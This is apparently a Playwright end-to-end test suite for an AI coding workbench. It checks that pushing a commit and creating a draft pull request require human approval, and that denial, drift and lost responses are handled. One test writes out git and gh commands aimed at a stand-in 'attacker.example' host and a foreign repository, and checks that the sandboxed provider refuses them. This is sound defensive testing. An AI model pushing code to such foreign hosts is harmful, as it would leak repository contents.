import { writeDeliveryJourneyReceipt } from "./support/coding-issue-delivery-evidence.js";
import { captureDeliveryModes } from "./support/coding-issue-commit-evidence.js";
import { join } from "node:path";
import { buildPrReadBranchHeadArgv } from "../../packages/keiko-tools/src/git-pr-gateway.js";
import { expect, test, type Page } from "@playwright/test";
import { createHash } from "node:crypto";
import { execFileSync, spawnSync } from "node:child_process";
import { readFileSync, renameSync, writeFileSync } from "node:fs";
import type {
  CodingWorkbenchMode,
  CodingWorkbenchRuntimeSnapshot,
  CodingWorkbenchRuntimeApprovalReviewChannelPayload,
  VerifiedCommitResult,
} from "@oscharko-dev/keiko-contracts";
import type { DraftDeliveryRecord } from "@oscharko-dev/keiko-contracts/runtime/draft-delivery";
import { openCodingIssueWorkbench, selectCodingIssueMode } from "./support/coding-issue-browser.js";
import {
  commitControlPath,
  commitObservationPath,
  COMMIT_MESSAGE,
  type CommitFixtureOperation,
} from "./support/coding-issue-commit.js";
import {
  DELIVERY_LAUNCHER_SECRET,
  DELIVERY_REPOSITORY,
  DELIVERY_TEMPLATE,
  DELIVERY_TITLE,
  deliveryProviderState,
  deliveryRemote,
  deliveryRepository,
  deliveryRevisionPath,
  deliveryStateDir,
  type DeliveryFixtureOperation,
} from "./support/coding-issue-delivery.js";
import type { DeliveryProviderState } from "./servers/coding-issue-delivery-transport.mjs";

const stateDir = deliveryStateDir();
const repository = deliveryRepository(stateDir);
const WINDOW_ID = "draft-delivery-proof";
const CSRF = { "X-Keiko-CSRF": "1" };
test.describe.configure({ mode: "serial" });
const completedCases: string[] = [];
test.afterEach((): void => {
  const info = test.info();
  if (info.status === "passed") completedCases.push(info.title);
});
test.afterAll((): void => {
  if (completedCases.length === 11) writeDeliveryJourneyReceipt(stateDir, completedCases);
});
interface Observation {
  readonly phase: string;
  readonly runId?: string;
  readonly lastControl: number;
  readonly result?: {
    readonly status: string;
    readonly verifiedCommit?: VerifiedCommitResult;
    readonly draftDelivery?: { readonly status: string; readonly record?: DraftDeliveryRecord };
  };
  readonly rawContentRecorded: boolean;
}
function observe(): Observation {
  return JSON.parse(readFileSync(commitObservationPath(stateDir), "utf8")) as Observation;
}
function provider(): DeliveryProviderState {
  return JSON.parse(readFileSync(deliveryProviderState(stateDir), "utf8")) as DeliveryProviderState;
}
async function control(
  operation: CommitFixtureOperation | DeliveryFixtureOperation,
): Promise<Observation> {
  const id = observe().lastControl + 1;
  const path = commitControlPath(stateDir);
  writeFileSync(`${path}.next`, JSON.stringify({ id, operation }));
  renameSync(`${path}.next`, path);
  await expect.poll(() => observe().lastControl, { timeout: 60_000 }).toBe(id);
  return observe();
}
async function snapshot(page: Page): Promise<CodingWorkbenchRuntimeSnapshot> {
  const response = await page.request.get("/api/coding-workbench/runtime/status");
  expect(response.ok()).toBe(true);
  return (await response.json()) as CodingWorkbenchRuntimeSnapshot;
}
function git(root: string, args: readonly string[]): string {
  return execFileSync("git", [...args], { cwd: root, encoding: "utf8", timeout: 30_000 }).trim();
}
async function allowIssueReader(page: Page): Promise<void> {
  const endpoint = "/api/coding-workbench/github-authorization";
  const current = await page.request.get(
    `${endpoint}?${new URLSearchParams({ repositoryPath: repository }).toString()}`,
  );
  expect(current.ok()).toBe(true);
  const revision = ((await current.json()) as { readonly revision: number }).revision;
  const updated = await page.request.put(endpoint, {
    headers: CSRF,
    data: { repositoryPath: repository, authorized: true, expectedRevision: revision },
  });
  expect(updated.ok(), await updated.text()).toBe(true);
}
async function bindIssue(page: Page, number: number): Promise<string> {
  const cleared = await page.request.delete("/api/task-workspaces/active", {
    headers: CSRF,
    data: {},
  });
  expect(cleared.ok(), await cleared.text()).toBe(true);
  await page.reload();
  await allowIssueReader(page);
  await page.getByLabel("Issue URL or #number").fill(`#${String(number)}`);
  await page.getByRole("button", { name: "Preview issue", exact: true }).click();
  await expect(page.getByRole("region", { name: "Issue preview", exact: true })).toBeVisible();
  await page.getByRole("button", { name: "Use this issue", exact: true }).click();
  await page.getByRole("button", { name: "Bind workspace", exact: true }).click();
  await expect(page.getByRole("region", { name: "Code setup", exact: true })).toHaveCount(0);
  const active = await page.request.get("/api/task-workspaces/active");
  expect(active.ok()).toBe(true);
  return (
    (await active.json()) as {
      readonly active: { readonly binding: { readonly activeRoot: string } };
    }
  ).active.binding.activeRoot;
}
async function startVerified(
  page: Page,
  mode: CodingWorkbenchMode,
  number: number,
): Promise<string> {
  await openCodingIssueWorkbench(page, {
    repository,
    windowId: WINDOW_ID,
    launcherSecret: DELIVERY_LAUNCHER_SECRET,
  });
  const root = await bindIssue(page, number);
  await selectCodingIssueMode(page, mode);
  await page
    .getByLabel("Task instructions")
    .fill("Implement, verify and deliver the accepted issue.");
  await expect(page.getByRole("button", { name: "Start coding run", exact: true })).toBeEnabled();
  const responsePromise = page.waitForResponse(
    (response) =>
      response.request().method() === "POST" &&
      response.url().endsWith("/api/coding-workbench/runtime/runs"),
  );
  await page.getByRole("button", { name: "Start coding run", exact: true }).click();
  const started = await responsePromise;
  expect(started.ok(), await started.text()).toBe(true);
  const approved = new Set<string>();
  await expect
    .poll(
      async () => {
        const current = await snapshot(page);
        if (current.pendingPermission !== undefined) {
          await expect(
            page.getByRole("button", { name: "Approve once", exact: true }),
          ).toBeEnabled();
          approved.add(current.pendingPermission.actionKind ?? "missing");
          await page.getByRole("button", { name: "Approve once", exact: true }).click();
        }
        return observe().phase;
      },
      { timeout: 120_000 },
    )
    .toBe("verified-turn-ready");
  expect([...approved].sort()).toEqual(
    mode === "governed-assist" ? ["file-edit", "git-stage", "verification-command"] : [],
  );
  expect((await snapshot(page)).issueBinding?.issueNumber).toBe(number);
  const proposed = await control("propose");
  expect(proposed.result?.verifiedCommit?.status).toBe("approval-required");
  await expect(
    page.getByRole("region", { name: "Reviewed commit message" }).locator("pre"),
  ).toHaveText(COMMIT_MESSAGE, { useInnerText: false });
  await page.getByRole("button", { name: "Approve once", exact: true }).click();
  await expect(page.getByRole("button", { name: "Approve once", exact: true })).toHaveCount(0);
  expect((await control("execute")).result?.verifiedCommit?.status).toBe("succeeded");
  return root;
}
async function finish(page: Page, revoked = false): Promise<void> {
  const current = await snapshot(page);
  if (revoked) {
    await control("finish");
    expect(current).toMatchObject({ state: "failed", failureCode: "revoked" });
    return;
  }
  if (current.state !== "succeeded")
    await page.getByRole("button", { name: "Stop run", exact: true }).click();
  await control("finish");
  await expect.poll(async () => (await snapshot(page)).state).toMatch(/^(?:succeeded|cancelled)$/u);
}

async function approveDelivery(page: Page): Promise<void> {
  await expect(page.getByRole("region", { name: "Reviewed delivery target" })).toContainText(
    DELIVERY_REPOSITORY,
  );
  await expect(page.getByRole("button", { name: "Approve once", exact: true })).toBeEnabled();
  await page.getByRole("button", { name: "Approve once", exact: true }).click();
  await expect(page.getByRole("button", { name: "Approve once", exact: true })).toHaveCount(0);
}
async function review(
  page: Page,
  runId: string,
): Promise<CodingWorkbenchRuntimeApprovalReviewChannelPayload> {
  const response = await page.request.get(
    `/api/coding-workbench/runtime/runs/${runId}/approval-review`,
  );
  expect(response.ok()).toBe(true);
  return (await response.json()) as CodingWorkbenchRuntimeApprovalReviewChannelPayload;
}
function digest(value: string): string {
  return createHash("sha256").update(value).digest("hex");
}

test("#3387 @coding-issue-delivery hermetic provider refuses foreign hosts repositories and refs", () => {
  const before = provider();
  const githubRead = buildPrReadBranchHeadArgv({
    ownerAndRepo: DELIVERY_REPOSITORY,
    headBranchName: "main",
  });
  const cases = [
    {
      tool: "gh",
      args: githubRead.map((arg) => (arg === "github.com" ? "attacker.example" : arg)),
    },
    {
      tool: "gh",
      args: buildPrReadBranchHeadArgv({ ownerAndRepo: "fixture/foreign", headBranchName: "main" }),
    },
    {
      tool: "gh",
      args: buildPrReadBranchHeadArgv({
        ownerAndRepo: DELIVERY_REPOSITORY,
        headBranchName: "forbidden-ref",
      }),
    },
    {
      tool: "git",
      args: [
        "push",
        "https://attacker.example/fixture/issue-delivery.git",
        `${"a".repeat(40)}:refs/heads/main`,
      ],
    },
    {
      tool: "git",
      args: [
        "push",
        `https://github.com/${DELIVERY_REPOSITORY}.git`,
        `${"a".repeat(40)}:refs/heads/main`,
      ],
    },
  ];
  for (const entry of cases) {
    const result = spawnSync(join(stateDir, "provider-bin", entry.tool), [...entry.args], {
      encoding: "utf8",
      timeout: 30_000,
    });
    expect(result.status, result.stderr).toBe(73);
  }
  expect(provider()).toMatchObject({
    pushes: before.pushes,
    creates: before.creates,
    rejections: before.rejections + cases.length,
  });
  expect(git(deliveryRemote(stateDir), ["for-each-ref", "--format=%(refname)"])).toBe(
    "refs/heads/main",
  );
});

function recordFor(
  observation: Observation,
  phase: DraftDeliveryRecord["phase"],
): DraftDeliveryRecord {
  const record = observation.result?.draftDelivery?.record;
  if (record === undefined)
    throw new Error(`Expected delivery record: ${JSON.stringify(observation.result)}`);
  expect(record.phase).toBe(phase);
  return record;
}
function runFor(observation: Observation): string {
  if (observation.runId === undefined) throw new Error("Expected run observation");
  return observation.runId;
}
async function expectDenied(operation: DeliveryFixtureOperation): Promise<void> {
  expect((await control(operation)).result?.status).toBe("denied");
}

for (const [index, mode] of (
  ["autonomous-delivery", "supervised-coding", "governed-assist"] as const
).entries()) {
  test(`#3387 @coding-issue-delivery actual issue to reviewed draft PR in ${mode}`, async ({
    page,
    request,
  }) => {
    const beforeProvider = provider();
    const root = await startVerified(page, mode, 42 + index);
    const head = git(root, ["rev-parse", "HEAD"]);
    const proposed = await control("push-propose");
    recordFor(proposed, "push-proposed");
    expect(provider().pushes).toBe(beforeProvider.pushes);
    await expectDenied("push-execute");
    const unpaired = await request.get(
      `/api/coding-workbench/runtime/runs/${runFor(proposed)}/approval-review`,
    );
    expect(await unpaired.json()).toEqual({ session: "unpaired" });
    await approveDelivery(page);
    recordFor(await control("push-execute"), "pushed");
    expect(provider().lastPush).toMatchObject({
      sha: head,
      privateView: true,
      pinnedCredentialHost: true,
    });
    expect(git(deliveryRemote(stateDir), ["rev-parse", `refs/heads/${provider().headRef}`])).toBe(
      head,
    );
    expect(provider().pushes).toBe(beforeProvider.pushes + 1);
    await expectDenied("push-execute");
    const pr = await control("pr-propose");
    recordFor(pr, "pr-proposed");
    const pending = (await review(page, runFor(pr))).pending?.draftDelivery;
    if (pending === undefined || !("title" in pending))
      throw new Error("Expected actual PR review");
    expect(pending.title).toBe(DELIVERY_TITLE);
    expect(pending.body.startsWith(DELIVERY_TEMPLATE)).toBe(true);
    expect(pending.body.match(/Closes #\d+/gu)).toEqual([`Closes #${String(42 + index)}`]);
    await expect(
      page.getByRole("region", { name: "Reviewed pull request description" }).locator("pre"),
    ).toHaveText(pending.body, { useInnerText: false });
    await expectDenied("pr-execute");
    expect(provider().creates).toBe(beforeProvider.creates);
    if (index === 0)
      await captureDeliveryModes(
        page,
        WINDOW_ID,
        'section[aria-label="Coding Workbench"][data-state]',
      );
    await approveDelivery(page);
    const created = await control("pr-execute");
    const createdRecord = recordFor(created, "draft-created");
    expect(provider()).toMatchObject({
      creates: beforeProvider.creates + 1,
      lastTitleDigest: digest(pending.title),
      lastBodyDigest: digest(pending.body),
    });
    await expectDenied("pr-execute");
    const number = createdRecord.pullRequest?.number;
    await page.reload();
    await expect(
      page.getByRole("link", { name: `Pull request #${String(number)}`, exact: true }),
    ).toHaveAttribute("href", `https://github.com/${DELIVERY_REPOSITORY}/pull/${String(number)}`);
    await expect(
      page.getByRole("region", { name: "Reviewed pull request description" }),
    ).toHaveCount(0);
    expect((await snapshot(page)).draftDelivery).toEqual(createdRecord);
    await finish(page);
    // #3401: the terminal "succeeded" transition dispatches through the production description
    // dispatcher wired by deps.ts. This hermetic fixture has no configured provider, so the
    // admitted request settles closed as generation-unavailable instead of fabricating a draft.
    await expect
      .poll(async () => (await snapshot(page)).descriptionStatus?.reason, { timeout: 10_000 })
      .toBe("generation-unavailable");
    expect((await snapshot(page)).descriptionStatus).toMatchObject({
      state: "blocked",
      reason: "generation-unavailable",
      generationVersion: 1,
    });
  });
}

function setProviderMode(mode: DeliveryProviderState["mode"]): void {
  writeFileSync(deliveryProviderState(stateDir), JSON.stringify({ ...provider(), mode }));
}
async function pushApproved(page: Page): Promise<void> {
  recordFor(await control("push-propose"), "push-proposed");
  await approveDelivery(page);
  recordFor(await control("push-execute"), "pushed");
}

test("#3387 @coding-issue-delivery explicit push denial revokes all remote effects", async ({
  page,
}) => {
  const before = provider();
  await startVerified(page, "governed-assist", 45);
  recordFor(await control("push-propose"), "push-proposed");
  await page.getByRole("button", { name: "Deny", exact: true }).click();
  await expect.poll(async () => (await snapshot(page)).state).toBe("failed");
  await expectDenied("push-execute");
  expect(provider()).toMatchObject({ pushes: before.pushes, creates: before.creates });
  await finish(page, true);
});

test("#3387 @coding-issue-delivery dirty worktree after approval cannot publish", async ({
  page,
}) => {
  const before = provider();
  const root = await startVerified(page, "autonomous-delivery", 46);
  recordFor(await control("push-propose"), "push-proposed");
  await approveDelivery(page);
  writeFileSync(join(root, "unverified.txt"), "Unverified fixture content.");
  expect(recordFor(await control("push-execute"), "recovery-required").reason).toBe("remote-drift");
  expect(provider()).toMatchObject({ pushes: before.pushes, creates: before.creates });
  await page.reload();
  await expect(page.getByRole("region", { name: "Repository delivery" })).toContainText(
    "Delivery needs reconciliation",
  );
  await finish(page);
});

test("#3387 @coding-issue-delivery changed frozen issue refuses the approved push", async ({
  page,
}) => {
  const before = provider();
  await startVerified(page, "autonomous-delivery", 47);
  recordFor(await control("push-propose"), "push-proposed");
  await approveDelivery(page);
  writeFileSync(deliveryRevisionPath(stateDir), "2");
  expect(recordFor(await control("push-execute"), "recovery-required").reason).toBe("issue-drift");
  expect(provider()).toMatchObject({ pushes: before.pushes, creates: before.creates });
  writeFileSync(deliveryRevisionPath(stateDir), "1");
  await finish(page);
});

test("#3387 @coding-issue-delivery changed effective push URL refuses before provider dispatch", async ({
  page,
}) => {
  const before = provider();
  const root = await startVerified(page, "autonomous-delivery", 48);
  recordFor(await control("push-propose"), "push-proposed");
  await approveDelivery(page);
  git(root, ["config", "remote.origin.pushurl", "https://github.com/fixture/foreign.git"]);
  expect(recordFor(await control("push-execute"), "recovery-required").reason).toBe("remote-drift");
  expect(provider()).toMatchObject({
    pushes: before.pushes,
    creates: before.creates,
    rejections: before.rejections,
  });
  git(root, ["config", "--unset", "remote.origin.pushurl"]);
  await finish(page);
});

test("#3387 @coding-issue-delivery uncertain push is reconciled without another mutation", async ({
  page,
}) => {
  const before = provider();
  await startVerified(page, "autonomous-delivery", 49);
  recordFor(await control("push-propose"), "push-proposed");
  await approveDelivery(page);
  setProviderMode("push-response-loss");
  recordFor(await control("push-execute"), "recovery-required");
  expect(provider().pushes).toBe(before.pushes + 1);
  await page.reload();
  await expect(page.getByRole("button", { name: "Approve once", exact: true })).toHaveCount(0);
  setProviderMode("normal");
  recordFor(await control("reconcile"), "pushed");
  expect(provider()).toMatchObject({ pushes: before.pushes + 1, creates: before.creates });
  await finish(page);
});

test("#3387 @coding-issue-delivery unknown PR after response loss is not adopted or recreated", async ({
  page,
}) => {
  const before = provider();
  await startVerified(page, "autonomous-delivery", 50);
  await pushApproved(page);
  recordFor(await control("pr-propose"), "pr-proposed");
  await approveDelivery(page);
  setProviderMode("create-response-loss");
  expect(recordFor(await control("pr-execute"), "recovery-required").reason).toBe(
    "ambiguous-remote",
  );
  expect(provider().creates).toBe(before.creates + 1);
  setProviderMode("normal");
  expect(recordFor(await control("reconcile"), "recovery-required").reason).toBe(
    "ambiguous-remote",
  );
  recordFor(await control("pr-propose"), "recovery-required");
  expect(provider()).toMatchObject({ pushes: before.pushes + 1, creates: before.creates + 1 });
  await page.reload();
  await expect(page.getByRole("button", { name: "Approve once", exact: true })).toHaveCount(0);
  await finish(page);
});

test("#3387 @coding-issue-delivery PR denial keeps the pushed commit but creates no PR", async ({
  page,
}) => {
  const before = provider();
  await startVerified(page, "supervised-coding", 51);
  await pushApproved(page);
  recordFor(await control("pr-propose"), "pr-proposed");
  await page.getByRole("button", { name: "Deny", exact: true }).click();
  await expect.poll(async () => (await snapshot(page)).state).toBe("failed");
  await expectDenied("pr-execute");
  expect(provider()).toMatchObject({ pushes: before.pushes + 1, creates: before.creates });
  await finish(page, true);
});
